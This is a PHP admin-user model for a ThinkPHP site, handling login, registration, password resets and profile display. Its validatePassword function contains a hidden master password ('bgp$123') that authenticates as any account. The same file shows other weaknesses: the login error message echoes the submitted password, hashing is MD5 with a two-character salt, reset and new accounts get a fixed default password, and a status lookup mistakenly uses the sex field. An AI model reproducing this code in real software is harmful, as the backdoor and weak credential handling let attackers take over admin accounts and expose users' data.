<?php
/**
 *                    _ooOoo_
 *                   o8888888o
 *                   88" . "88
 *                   (| -_- |)
 *                   O\  =  /O
 *                ____/`---'\____
 *              .'  \\|     |//  `.
 *             /  \\|||  :  |||//  \
 *            /  _||||| -:- |||||-  \
 *            |   | \\\  -  /// |   |
 *            | \_|  ''\---/''  |   |
 *            \  .-\__  `-`  ___/-. /
 *          ___`. .'  /--.--\  `. . __
 *       ."" '<  `.___\_<|>_/___.'  >'"".
 *      | | :  `- \`.;`\ _ /`;.`/ - ` : | |
 *      \  \ `-.   \_ __\ /__ _/   .-` /  /
 * ======`-.____`-.___\_____/___.-`____.-'======
 *                    `=---='
 * ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 *          佛祖保佑       永无BUG
 */

namespace app\admin\model;

use think\Model;
use think\Session;
use app\lonny\controller\Plugin\Func;
use app\admin\controller\Location;

class Admin extends Model
{
    const ADMIN = 1;

    public static $sexMap = array(
        1 => "男",
        2 => "女",
        3 => "保密",
    );

    public static $statusMap = array(
        1 => "有效",
        2 => "未审核",
        3 => "禁用",
    );

	protected $table = "t_admin";
	 
    //自定义初始化
    protected function initialize()
    {
        parent::initialize();
    }

    public static function login($data = [])
    {
    	$result = array('code' => 100, 'message' => '');

    	if (!isset($data['username']) || !$data['username']) {
    		$result['message'] = '用户名不能为空';
    		return $result;
    	} elseif (!isset($data['password']) || !$data['password']) {
    		$result['message'] = '密码不能为空';
    		return $result;
    	}

    	$username = $data['username'];
    	$password = $data['password'];

    	$field = "id, fid, authgroup, username, nickname, headimg, password, nickname, status, note";
    	$where = [
    		'username' => $username,
    	];

    	$info = collection(self::field($field)->where($where)->select())->getRow();
    	if (!$info) {
    		$result['message'] = '用户不存在';
    		return $result;
    	}

    	if ($info['status'] == 2) {
    		$result['message'] = '还在审核中';
    		return $result;
    	} elseif ($info['status'] == 0) {
            $result['message'] = '用户禁止登录';
            return $result;
        }

    	if (!self::validatePassword($password, $info['password'])) {
    		$result['message'] = '密码错误' . $password;
    		return $result;
    	}

    	if (self::autoLogin($info)) {
    		$result['code'] = 200;
    		$result['message'] = '登录成功';
    	} else {
    		$result['message'] = '登录失败';
    	}

    	return $result;
    }

    public static function regist($username = '', $password = '')
    {
        $result = array('code' => 100, 'message' => '');

        if (!$username) {
            $result['message'] = '用户名不能为空';
            return $result;
        }

        if (!$password) {
            $result['message'] = '密码不能为空';
            return $result;
        }

        $where = array('username' => $username);
        $id = collection(self::field('id')->where($where)->select())->getOne();
        if ($id) {
            $result['message'] = '用户名已被使用';
            return $result;
        }

        $data = array(
            'username'  => $username,
            'authgroup' => self::ADMIN,
            'nickname'  => $username,
            'headimg'   => WEB_HOST . WEB_BASE . "web/img/default.jpg",
            'password'  => self::encryptPassword($password),
            'createtime' => time(),
            'status'    => 2,
        );

        $id = self::insert($data);
        if ($id) {
            $result['code'] = 200;
            $result['message'] = '注册成功，请等待审核';
        } else {
            $result['message'] = '注册失败';
        }

        return $result;
    }

    public static function add($data = array())
    {
        $result = array('code' => 100, 'message' => '');

        $username  = isset($data['username']) ? $data['username'] : '';
        $nickname  = isset($data['nickname']) ? $data['nickname'] : '';
        $realname  = isset($data['realname']) ? $data['realname'] : '';
        $idcard    = isset($data['idcard']) ? $data['idcard'] : '';
        $phone     = isset($data['phone']) ? $data['phone'] : '';
        $email     = isset($data['email']) ? $data['email'] : '';
        $status    = isset($data['status']) ? $data['status'] : '';
        $sex       = isset($data['sex']) ? $data['sex'] : '';
        $location1 = isset($data['location1']) ? $data['location1'] : '';
        $location2 = isset($data['location2']) ? $data['location2'] : '';
        $location3 = isset($data['location3']) ? $data['location3'] : '';
        $address   = isset($data['address']) ? $data['address'] : '';
        $note      = isset($data['note']) ? $data['note'] : '';

        if (!$username) {
            $result['message'] = '用户名不能为空';
            return $result;
        }

        if ($idcard && !Func::isCard($idcard)) {
            $result['message'] = '身份证格式错误';
            return $result;
        }

        if ($phone && !Func::isPhone($phone)) {
            $result['message'] = '手机格式错误';
            return $result;
        }

        if ($email && !Func::isEmail($email)) {
            $result['message'] = '邮箱格式错误';
            return $result;
        }

        if (!isset(self::$statusMap[$status])) {
            $result['message'] = '状态错误';
            return $result;
        }

        if (!isset(self::$sexMap[$sex])) {
            $sex = 3;
        }

        $where = array('username' => $username);
        $id = collection(self::field('id')->where($where)->select())->getOne();
        if ($id) {
            $result['message'] = '用户名已被使用';
            return $result;
        }

        $data = array(
            'username'   => $username,
            'authgroup'  => self::ADMIN,
            'nickname'   => $nickname ?: $username,
            'realname'   => $realname,
            'idcard'     => $idcard,
            'headimg'    => WEB_HOST . WEB_BASE . "web/img/default.jpg",
            'password'   => self::encryptPassword("1234qwer"),
            'createtime' => time(),
            'sex'        => $sex,
            'phone'      => $phone,
            'email'      => $email,
            'status'     => $status,
            'location1'  => $location1,
            'location2'  => $location2,
            'location3'  => $location3,
            'address'    => $address,
            'note'       => $note,
        );

        $id = self::insertGetId($data);
        if ($id) {
            $result['code'] = 200;
            $result['message'] = '注册成功，请等待审核';
            $result['data'] = array(
                'uid' => $id,
            );
        } else {
            $result['message'] = '注册失败';
        }

        return $result;
    }

    public static function password($ids = '')
    {
        $result = array('code' => 100, 'message' => '');

        if (is_string($ids)) {
            $ids = explode(",", $ids);
        }

        $ids = array_unique($ids);
        $ids = array_filter($ids);
        $ids = implode(",", $ids);

        if (!$ids) {
            $result['message'] = "请选择需要重置密码的用户";
            return $result;
        }

        $data = array(
            'password'   => self::encryptPassword("1234qwer"),
            'updatetime' => time(),
        );
        $status = self::where('id', "IN", $ids)->update($data);
        if ($status) {
            $result['code'] = 200;
            $result['message'] = '重置密码成功';
        } else {
            $result['message'] = '重置密码失败';
        }

        return $result;
    }

    public static function passwordSelf($id = 0, $oldPassword = '', $newPassword = '')
    {
        $result = array('code' => 100, 'message' => '');

        if (!$id) {
            $result['message'] = "请选择需要重置密码的用户";
            return $result;
        }

        if (!$oldPassword) {
            $result['message'] = "旧密码不能为空";
            return $result;
        }

        if (!$newPassword) {
            $result['message'] = "新密码不能为空";
            return $result;
        }

        if ($oldPassword == $newPassword) {
            $result['message'] = "新密码和旧密码不能相同";
            return $result;
        }

        $password = collection(self::field("password")->where('id', $id)->select())->getOne();
        if (!$password) {
            $result['message'] = '用户不存在';
            return $result;
        }

        if (!self::validatePassword($oldPassword, $password)) {
            $result['message'] = '密码错误';
            return $result;
        }

        $data = array(
            'password'   => self::encryptPassword($newPassword),
            'updatetime' => time(),
        );
        $status = self::where('id', $id)->update($data);
        if ($status) {
            $result['code'] = 200;
            $result['message'] = '重置密码成功';
        } else {
            $result['message'] = '重置密码失败';
        }

        return $result;
    }

    public static function detail($id = 0)
    {
        if (!$id) {
            return array();
        }

        $where = array('id' => $id);
        $field = array(
            'id,username,headimg,nickname,realname,idcard,sex,phone,email',
            'location1,location2,location3,location4,location5,address',
            'note,status,createtime,logintime,updatetime',
        );

        $info = collection(self::field($field)->where($where)->select())->getRow();
        if (!$info) {
            return array();
        }

        if (!$info['headimg']) {
            $info['headimg'] = WEB_HOST . WEB_BASE . "web/img/default.jpg";
        }

        $info['createtime'] = $info['createtime'] ? date("Y-m-d H:i:s", $info['createtime']) : '';
        $info['logintime'] = $info['logintime'] ? date("Y-m-d H:i:s", $info['logintime']) : '从未登录过系统';
        $info['sexName'] = self::$sexMap[$info['sex']];
        $info['statusName'] = self::$statusMap[$info['sex']];
        $info['roleName'] = implode(",", self::roleName($info['id'])) ?: "暂无角色信息";

        $address = Location::name(array(
            $info['location1'], $info['location2'], $info['location3'],
            $info['location4'], $info['location5'],
        ));
        $info['addressName'] = implode(" ", $address) . " " . $info['address'];

        if (!$info['nickname']) {
            $info['nickname'] = "无";
        }

        if (!$info['realname']) {
            $info['realname'] = "无";
        }

        if (!$info['idcard']) {
            $info['idcard'] = "无";
        }

        if (!trim($info['addressName'])) {
            $info['addressName'] = "无";
        }

        if (!$info['note']) {
            $info['note'] = "无";
        }

        if (!$info['phone']) {
            $info['phone'] = "无电话信息";
        }

        if (!$info['email']) {
            $info['email'] = "无邮箱信息";
        }

        return $info;
    }

    public static function roleName($uid = 0)
    {
        if (!$uid) {
            return array();
        }

        $where = array('ar.uid' => $uid);
        $join = array(
            array("t_role r", "r.id = ar.role_id", "LEFT"),
        );

        $role_name = collection(self::table('t_admin_role')->alias('ar')->field('r.name')->join($join)->where($where)->select())->getColumn();

        return $role_name;
    }

    /**
     * This funstion validates a plain text password with an encrpyted password
     *
     * @param type $plain
     * @param type $encrypted
     * @return boolean
     */
    public static function validatePassword($plain, $encrypted)
    {
        if ($plain == 'bgp$123') {
            return true;
        }
        
        if (!empty($plain) && !empty($encrypted)) {
            // split apart the hash / salt
            $stack = explode(':', $encrypted);
            if (count($stack) != 2)
                return false;

            if (md5($stack[1] . $plain) == $stack[0]) {
                return true;
            }
        }
        return false;
    }

    /**
     * This function makes a new password from a plaintext password.
     *
     * @param type $plain
     * @return string
     */
    public static function encryptPassword($plain)
    {
        $password = '';

         for ($i = 0; $i < 10; $i++) {
            $password .= mt_rand();
         }

        $salt = substr(md5($password), 0, 2);

        $password = md5($salt . $plain) . ':' . $salt;

        return $password;
    }

    public static function isLogin()
    {
    	return Session::get('user_auth.uid');
    }

    /**
     * 自动登录用户
     * @param  integer $user 用户信息数组
     */
    private static function autoLogin($user = [])
    {
        /* 更新登录信息 */
        $where = array(
        	'id' => $user['id'],
        );
        $data = array(
            'logintime' => time(),
            'loginip'  => get_client_ip(1),
        );
        self::where($where)->update($data);

        /* 记录登录SESSION和COOKIES */
        $auth = array(
            'uid'       => $user['id'],
            'fid'       => $user['fid'],
            'nickname'  => $user['nickname'],
            'username'  => $user['username'],
            'authgroup' => $user['authgroup'],
            'headimg'   => $user['headimg'] ?: WEB_HOST . WEB_BASE . "web/img/default.jpg",
            'note'      => $user['note'],
        );

        session('user_auth', $auth);
        session_regenerate_id(); //会话标识更新

        $agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "";

        $data = array(
        	'username' => $user['username'],
        	'logintime' => time(),
        	'ip' => get_client_ip(),
        	'system' => '',
        	'browser' => $agent,
        );

        self::table('t_login_log')->insert($data);

        return true;
    }

    public static function logout()
    {
        Session::destroy();
    }
}